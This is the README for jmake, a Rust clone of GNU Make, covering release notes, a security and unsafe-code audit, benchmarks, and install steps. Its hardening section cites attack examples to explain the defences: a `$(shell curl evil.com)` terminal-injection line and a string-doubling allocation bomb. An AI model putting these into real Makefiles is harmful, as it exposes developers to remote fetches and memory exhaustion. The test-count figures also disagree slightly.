# jmake

A clean-room drop-in replacement for GNU Make 4.4.1, written in Rust.

## What's new in 1.2.5

Highlights since 1.2.3:

- **Valkey/jemalloc end-to-end fix.** Static pattern rules can now declare prerequisites in one statement and the recipe in another (`$(C_JET_OBJS): $(objroot)src/%.jet.$(O): $(srcroot)src/%.c` followed later by `$(C_JET_OBJS): %.$(O):\n\trecipe`). Previously jmake lost the prerequisite when the recipe and prereq-pattern were split across declarations, causing `cc: error: no input files`. Verified end-to-end on Raspberry Pi 5: jemalloc + Valkey build clean, server runs, `PING/SET/GET` work.
- **Parser fix for tab-indented assignment inside conditionals.** `ifeq` and friends no longer leave the parser in recipe-context, so a top-level `\tFINAL_LIBS += -ldl` inside `ifeq ($(uname_S),Linux)` is correctly parsed as a variable assignment instead of leaking into the preceding rule's recipe.
- **Security hardening.** 256 MiB cap on expanded-value size (defeats assignment-doubling and `$(foreach)`-explosion allocation bombs that the existing 1000-deep expansion limit didn't catch). ANSI escape sanitization for `$(info)`/`$(warning)`/`$(error)` output when stdout is a TTY (prevents terminal hijack via `$(warning $(shell curl evil.com))`); pass-through when piped so CI and log capture are unaffected.
- **Big-O wins.** ~6× speedup on `$(realpath)`/`$(abspath)`, 4.5–4.8× on `$(addsuffix)`/`$(addprefix)`/`$(join)` and eight other word-level built-ins (eliminated `Vec<String>` intermediates + final `.join(" ")`). `$(foreach)` reuses its `auto_vars` map across iterations instead of cloning per word. Built-in variable name lookup converted from O(n) linear scan to O(1) `OnceLock<HashSet>`. Pattern rule search no longer allocates a `Vec<&Rule>` per uncached call.
- **132 upstream tests adopted.** Of 906 GNU Make 4.4.1 sub-tests extracted from the upstream test suite, 598 pass against jmake. The 132 highest-value passing tests (functions, variables, conditionals, escape sequences, backslash-newline) are now part of jmake's CI as regression coverage. The other 308 failures live in `tests/upstream_441_GAPS.md` triaged into 9 root-cause categories — top issues are MAKEFLAGS letter-flag propagation in recursive make (96 fails) and chained implicit rule search (60+ fails); both queued for 1.3.0.
- **Safety audit.** All 11 unsafe sites re-documented with the canonical per-bullet SAFETY block form. Setup-time bounds checks promoted from `debug_assert!` to `assert!` so release builds can't drop the guard. Two `*const Self as *mut Self` casts in `$(eval)` re-entrancy flagged with a `#[cfg(kani)]` harness opportunity and a "needs `RefCell<MakeDatabase>` refactor before public 1.x" TODO. See [`UNSAFE_AUDIT.md`](UNSAFE_AUDIT.md).

## Status

- **270 tests** (17 unit + 249 feature + 4 ignored fragile-fixture + 5 ignored realworld-vendor), zero failing
- **11 unsafe sites** total: 9 `unsafe { }` blocks + 2 `unsafe impl Sync/Send` lines, all in 2 files (`signal_handler.rs`, `eval/expand.rs`). Each has a multi-bullet SAFETY comment and runtime/compile-time verification; see audit below.
- **25,486 lines** of Rust
- **Zero compiler warnings** — `warnings = "deny"` + `rust-2018-idioms = "deny"`
- Static-musl release binary: ~2.5 MB, no runtime dependencies

## Architecture

```
CLI parsing + env reads (cli.rs, main.rs)
        ↓
Validated domain types (JobCount, RecursionDepth)
        ↓
Pure evaluation core (eval/, parser/, functions/)
        ↓
Executor with mtime cache + parallel job spawning (exec/)
```

### Module responsibilities

| Module | Lines | Role |
|--------|-------|------|
| `exec/mod.rs` | 7,284 | Build execution, dependency graph traversal, recipe dispatch |
| `eval/mod.rs` | 4,944 | State machine: variable init, makefile reading, rule registration |
| `parser/mod.rs` | 1,998 | Lexical analysis, line continuation, conditional handling |
| `eval/expand.rs` | 1,939 | Variable expansion (hottest path), function dispatch |
| `exec/parallel.rs` | 1,470 | Parallel job spawning, wait/signal, output serialization |
| `functions/mod.rs` | 1,324 | 35+ built-in functions (patsubst, foreach, shell, etc.) |
| `cli.rs` | 1,111 | Argument parsing, MAKEFLAGS, --version/--help |
| `types.rs` | 847 | Core data structures, newtypes (JobCount, RecursionDepth) |
| `signal_handler.rs` | 459 | Async-signal-safe SIGTERM handler (the 9-of-11 unsafe sites live here) |
| `parser/directives.rs` | 455 | `ifeq`/`ifdef`/`include`/`export`/etc. directives |

## Security audit

### Trust model

A Makefile is **trusted code**, like a shell script you `chmod +x` and run. Running a hostile Makefile can do whatever a shell script can — execute commands, write files, exfiltrate. jmake's hardening is therefore aimed at **accidental DoS** (an honest Makefile triggering pathological behavior) and **adjacent-trust attacks** (Makefiles that consume untrusted data via `$(shell)`, `include`, or `$(file <…)` and let it influence the build), not at sandboxing hostile Makefiles.

### Hardening landed in 1.2.5

| Class | Threat | Mitigation |
|---|---|---|
| Allocation bomb | `S_n := $(S_{n-1})$(S_{n-1})` doubles a string per line — 30 lines ≈ 1 GiB, exhausts RAM before the 1000-deep expansion limit would fire | 256 MiB cap on per-expansion output size; exits 2 with diagnostic |
| Terminal escape injection | `$(warning $(EVIL))` where EVIL contains `\e[2J\e[H` or `\e]0;…\007` clears/retitles the developer's interactive terminal | CSI/OSC/charset/raw-control sanitization, applied **only** when stdout is a TTY (piped output unchanged so CI and logs are not broken) |

### Pre-existing controls (from 1.2.x)

| Class | Mitigation |
|---|---|
| Expansion depth | Hard limit 1000 levels (catches direct/indirect recursive variable bombs) |
| `MAKEFLAGS -j` parsing | Integer overflow hardened; invalid values produce diagnostic |
| Environment propagation | Matches GNU Make (all env vars passed through; `unexport` to suppress) |
| Signal handler | Verified async-signal-safe: only `write/unlink/signal/raise` syscalls; no `malloc`, no locks; uses `UnsafeCell` + atomics for buffer handoff |
| Include recursion | Bounded at 200 levels |
| `MAKEFLAGS` letter-flag parsing | Compact form (`Bik...`) hardened against malformed input |

### Known unmitigated DoS surfaces (queued for 1.2.6)

| Issue | Risk | Status |
|---|---|---|
| `$(foreach)` over 1M-word list with expensive body | CPU-time exhaustion, no output-size growth → 256 MiB cap doesn't catch it | Needs `MAX_FOREACH_ITERATIONS` |
| `include $(wildcard /tmp/*.mk)` from a writable directory | Width attack — depth limit prevents recursion but not file count | Needs `MAX_INCLUDED_FILES` |
| `$(shell yes \| head -c 256M)` shell capture | 256 MiB cap checks the *expanded value*; initial shell-stdout capture is unbounded | Needs read-side ceiling in `fn_shell_exec` |

## Unsafe code

11 sites total, in 2 files. None are in the hot path of normal builds.

### `signal_handler.rs` (9 sites: 7 `unsafe { }` blocks + 2 `unsafe impl`)

Async-signal-safe SIGTERM handler. Sub-second cleanup of temp files when the user hits Ctrl-C during a long build.

The unsafe arises because POSIX signal handlers are forbidden from calling almost any C library function — definitely no `malloc`, no `pthread_mutex`, no `printf`. Rust's safe FFI wrappers all assume those are allowed, so we use raw `libc::write`/`libc::unlink`/`libc::signal`/`libc::raise` from inside the handler and a fixed-size `UnsafeCell` buffer + atomic length to hand off the temp-file path from the main thread to the handler.

**Verified invariants:**

- **I1 — single-threaded write side.** jmake is single-threaded; only the main thread writes the path buffer before installing the handler. The handler reads it. No races.
- **I2 — Release/Acquire fence pair.** Main thread Release-stores the length AFTER writing the bytes; handler Acquire-loads the length BEFORE reading the bytes.
- **I3 — Only POSIX async-signal-safe syscalls in handler.** Exhaustive review: handler calls `write(2)`, `unlink(2)`, `signal(2)`, `raise(2)` — all on POSIX's async-signal-safe list. No Rust formatting machinery, no allocator calls.
- **I4 — No live Rust references during raw writes.** The `UnsafeCell` is the storage for the path bytes; we go straight from raw pointer to `libc::write` with no `&[u8]` slice constructed across the call.

**Runtime verification:**

- `assert!` (promoted from `debug_assert!` in 1.2.5) on all setup-time buffer-length bounds, so release builds can't drop the guard if a refactor ever removes the `.min(MAX_PATH)`.
- Compile-time const assertions on `MAX_PATH` (4096) and `MAX_MSG` (256) sizes.

### `eval/expand.rs` (2 sites)

`&self as *const Self as *mut Self` cast for `$(eval)` re-entrancy. `$(eval text)` defines new rules and variables, which means it needs `&mut MakeState` — but it's called from inside an `&self` expansion method. The cast lets us run the inner parser.

**Verified invariants:**

- No live `IndexMap` references during the cast (values are `.clone()`'d before the unsafe block).
- No live `RefCell` borrows (`debug_assert!(try_borrow().is_ok())` on every `RefCell` field).
- Single-threaded (`MakeState` is `!Send + !Sync`).

**Known limitation** (also tracked in [`UNSAFE_AUDIT.md`](UNSAFE_AUDIT.md)): these two sites are **not provably sound under Stacked Borrows / Miri**. They work because the runtime invariants hold, but Miri may complain. The fix is to make the database `RefCell<MakeDatabase>` and use interior mutability properly; that refactor is gated for 1.3.0.

Full audit, including the line-by-line list of each unsafe block's bullets and what enforces them, lives in [`UNSAFE_AUDIT.md`](UNSAFE_AUDIT.md).

## Performance optimizations

- **Word-level built-in functions** (`addsuffix`, `addprefix`, `join`, `patsubst`, `filter`, `filter-out`, `strip`, `dir`, `notdir`, `suffix`, `basename`, `realpath`, `abspath`, `sort`, substitution refs): direct `String::push_str` accumulation instead of `Vec<&str>` + `Vec<String>` + final `.join(" ")`. ~6× speedup on `realpath`/`abspath`, 4.5–4.8× on the rest (benchmarked in `benches/functions_bench.rs`).
- **`$(BUILTIN_VARS)` lookup**: O(n) linear scan of a 27-element slice → O(1) `OnceLock<HashSet>`. Hot under `--warn-undefined-variables`.
- **`$(foreach)`**: per-iteration `format!("$({})", var)` precomputed once outside loop; `body.contains(pattern)` skip-guards each `body.replace()` so bodies that don't reference the loop variable avoid an O(body_len) scan per word; `auto_vars` HashMap cloned once outside the loop and mutated in place (insert/remove) instead of cloned per word.
- **`find_pattern_rule_inner`**: heap-allocated `Vec<&Rule>` per uncached call → chained iterator that re-creates the cheap chain per pass. Significant at CPython/musl scale where thousands of header files trigger implicit-rule searches.
- **Built-in function dispatch**: `OnceLock<HashMap>` — zero allocation after first call.
- **File mtime cache**: each file `stat()`'d at most once per build pass; evicted after recipe runs.
- **`sort_unstable`** for `$(sort)` — stability not observable after dedup.
- **Pre-sized allocations**: `HashMap::with_capacity` and `Vec::with_capacity` on hot paths.

## Compatibility

Tested against documented GNU Make 4.4.1 behavior for:

- All variable flavors (`=`, `:=`, `::=`, `:::=`, `?=`, `+=`, `!=`)
- All automatic variables (`$@`, `$<`, `$^`, `$+`, `$*`, `$?`, plus D/F variants)
- Pattern rules, static pattern rules (including the iter-1 split-declaration fix), pattern-specific variables
- 35+ built-in functions across text/file/conditional/flow/shell categories
- `ifeq`/`ifneq`/`ifdef`/`ifndef` with all quoting styles, including `else if` chains
- `include`/`-include`/`sinclude`
- `.PHONY`, `.PRECIOUS`, `.SECONDARY`, `.DELETE_ON_ERROR`, `.ONESHELL`
- `VPATH`/`vpath` directive
- Order-only prerequisites
- `define`/`endef`, `export`/`unexport`
- Multi-target rules, double-colon rules
- `$(MAKECMDGOALS)`, `MAKELEVEL`, recursive make

### Real-world build coverage

| Project | Build | Smoke test |
|---|---|---|
| **jemalloc 5.3.0** (Valkey's vendored copy) | ✅ Pi 5 aarch64, full build with `-j2` | n/a |
| **Valkey 9.0.4** (full server + cli + benchmark) | ✅ Pi 5 aarch64, builds 3 binaries (~13 MB server) | ✅ server starts, `PING`→`PONG`, `SET`/`GET` round-trip |

### Upstream GNU Make 4.4.1 test suite

Of 906 sub-tests extracted from upstream:

- **598 pass** against jmake (66 %)
- **132 adopted** into jmake's CI as regression coverage
- **308 known failures** documented in `tests/upstream_441_GAPS.md` across 9 categories; top backlog: MAKEFLAGS letter-flag propagation in recursive make (96), chained implicit rule search (60+), `.INTERMEDIATE` (8), `.WAIT` separator (10), double-colon per-rule staleness (6)

## Install (any Linux)

One-liner — installs the latest `.jpkg` to `/usr/local`:

```sh
curl -fsSL https://raw.githubusercontent.com/stormj-UH/jmake/main/install.sh | sh
```

By default the installer drops **only** the `jmake` binary at `$PREFIX/bin/jmake`, plus `LICENSE` and any man pages shipped in the package. It does **not** create a `make` symlink, and it **never** modifies `/usr/bin/make` or any other system binary.

If your terminal is interactive, the installer asks once whether you want a `$PREFIX/bin/make → jmake` symlink. To skip the prompt non-interactively, pass either `--no-prompt` (assume "no") or `--yes` (assume "yes").

```sh
# pin a version
curl -fsSL .../install.sh | sh -s -- --version 1.2.5 --no-prompt

# unprivileged install to ~/.local
curl -fsSL .../install.sh | sh -s -- --prefix "$HOME/.local" --no-prompt

# also create $PREFIX/bin/make -> jmake (never touches /usr/bin/make)
curl -fsSL .../install.sh | sh -s -- --make-default --no-prompt
```

If you skip the symlink at install time and want it later:

```sh
sh install.sh --prefix /usr/local --make-default --no-prompt
# or just
ln -sf jmake /usr/local/bin/make
```

### Flags

| Flag                  | Effect                                                              |
|-----------------------|---------------------------------------------------------------------|
| `--version <VER>`     | jmake version to install (default `1.2.5`).                         |
| `--prefix <DIR>`      | Install prefix (default `/usr/local`).                              |
| `--arch <ARCH>`       | Override architecture detection (`x86_64` or `aarch64`).            |
| `--make-default`      | Opt-in: create `$PREFIX/bin/make → jmake`. Never touches `/usr/bin/make`. |
| `--no-make-default`   | Default behavior. Forces "no" even when paired with `--yes`.        |
| `--no-prompt`         | Skip the interactive prompt; assume "no" for every opt-in.          |
| `--yes`, `-y`         | Skip the interactive prompt; assume "yes" for every opt-in.         |
| `--help`, `-h`        | Print usage and exit.                                               |

All long flags also accept the `--key=value` form.

If `--make-default` is enabled and `/usr/bin/make` precedes `$PREFIX/bin` on your `$PATH`, the installer prints a loud warning. Plain `make` will still invoke the system make until you reorder `$PATH`.

**POSIX-strict.** The installer is plain `/bin/sh` — no bashisms. It is validated against `dash -n`, `mksh -n`, and `shellcheck -s sh` and runs unmodified on busybox, dash, mksh, ash, and bash.

**Architectures:** `x86_64`, `aarch64` (override with `--arch`).

**Required tools:** `curl` or `wget`, plus `zstd`, `tar`, `od`, and `dd`.

### Installation (other Linuxes)

For distros without a native package (anything outside Jonerix), use the same `install.sh` — it's POSIX shell, dependency-free at runtime, and only needs the tools listed above. The script downloads `jmake-<VERSION>-<ARCH>.jpkg` from the [Jonerix release page](https://github.com/stormj-UH/jonerix/releases/tag/packages), verifies the `JPKG` magic, extracts the zstd-compressed tar payload, and installs the static-musl binary plus license file under `$PREFIX`. There are no glibc requirements — the binary runs on Alpine, Void, Slackware, Debian, RHEL, Arch, NixOS (via `--prefix`), and busybox-based systems alike.

If `$PREFIX` isn't writable by the current user, the installer escalates with `sudo` for the install steps only. To install without root, use `--prefix "$HOME/.local"` and ensure `$HOME/.local/bin` is on your `$PATH`.

## Building

```sh
cargo build --release
```

The resulting binary is ~2.5 MB static (musl) with no runtime dependencies.

## Testing

```sh
cargo test --release
```

Run the criterion benchmarks:

```sh
cargo bench --bench functions_bench
```

Re-run the upstream GNU Make 4.4.1 compat extractor (regenerates the adopted-test set when a new upstream release lands):

```sh
tests/upstream_441_runner.sh
```

## `JMAKE_TEST_MODE`

Setting `JMAKE_TEST_MODE=1` switches `--version`, error formats, and other identifying strings to GNU Make 4.4.1's exact output for byte-equivalent comparison in test harnesses. Without the variable, jmake identifies itself normally.

## License

MIT — (c) 2026 Jon-Erik G. Storm, Inc., a California Corporation, doing business as LAVA GOAT SOFTWARE.
